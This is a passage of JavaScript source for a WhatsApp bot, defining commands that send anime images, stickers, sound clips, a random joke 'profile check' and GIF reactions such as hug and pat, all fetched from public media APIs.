            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
 
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'traceanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return replygcyuta("*Respond to an image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return replygcyuta("*Error: Could not track the anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url: video}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Yuta.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error("Error:", error);
    replygcyuta("*Error: Could not track the anime or send the video.*");
  }
};
break
			case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
			case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Yuta.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return XeonStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replygcyuta(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replygcyuta('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				Yuta.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				Yuta.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replygcyuta(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
			case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
Yuta_dev = await getBuffer(`https://github.com/Yuta-Okkotsu/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await Yuta.sendMessage(m.chat, { audio: Yuta_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
			case 'checkme':{
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${m.pushName}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await Yuta.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppxeon = await getBuffer(ppuser)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: profile
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: ppxeon, mentions: [bet]}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [bet], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
			case 'hug': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} hugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cry': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cried themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kill': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} killed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} patted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} licked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kiss': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} kissed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bit themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
